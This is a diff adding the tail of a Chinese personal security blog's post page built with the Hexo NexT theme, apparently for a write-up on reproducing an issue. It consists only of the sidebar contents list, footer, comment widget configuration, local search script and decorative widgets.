+          
+
+          
+          
+          
+          <br>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=29045579&auto=0&height=32"></iframe>
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#先说说自己当时做的过程"><span class="nav-number">1.</span> <span class="nav-text">先说说自己当时做的过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#然后开始复现"><span class="nav-number">2.</span> <span class="nav-text">然后开始复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#思考"><span class="nav-number">3.</span> <span class="nav-text">思考</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Miracle778</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">264k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">4:01</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'w9nX4X8WpdsRFrCFoTt7cpqz-gzGzoHsz',
+    appKey: 'H3aV3vWVqkmAgeD0ep6RVf07',
+    placeholder: 'ヾﾉ≧∀≦)o 来呀！快活呀！~',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn'
+  });
+</script>
+
+
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('复制');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"superSample":2,"width":170,"height":380,"position":"right","hOffset":50,"vOffset":-7},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
